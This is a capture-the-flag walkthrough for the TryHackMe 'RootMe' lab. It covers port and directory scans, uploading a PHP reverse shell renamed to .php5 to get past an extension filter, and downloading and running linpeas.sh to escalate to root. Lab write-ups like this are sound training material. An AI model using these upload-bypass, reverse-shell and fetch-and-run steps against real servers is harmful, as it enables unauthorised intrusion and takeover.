# TryHackMe - RootMe Writeup

## Nmap Scan

```bash
nmap -sT -T4 10.10.150.49
```

Discovered open ports:
- **22/tcp** - SSH
- **80/tcp** - HTTP

- AND
`nmap -sV -p 22,80 10.10.250.49`

- **Apache Version:** 2.4.29

## Directory Enumeration

Used `gobuster` to find hidden directories.

```bash
gobuster dir -u http://10.10.150.49 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered directories:
- `/uploads`
- `/panel`

## File Upload Exploit

Found an upload form in the `/panel` directory. Tried uploading a PHP reverse shell.

Copied the default PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edited with `leafpad` and added my IP address and port.

Initial upload of `.php` was blocked, so renamed to `.php5`:

```bash
mv shell.php shell.php5
```

Uploaded successfully and triggered reverse shell.

## User Flag

After getting a shell, found and read the user flag:

```bash
cat /user.txt
```

## Privilege Escalation

Transferred and executed `linpeas.sh`:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Used the information from `linpeas` to escalate privileges and then:

```bash
cat /root/root.txt
```

## Flags Obtained

- ✅ `user.txt`
- ✅ `root.txt`
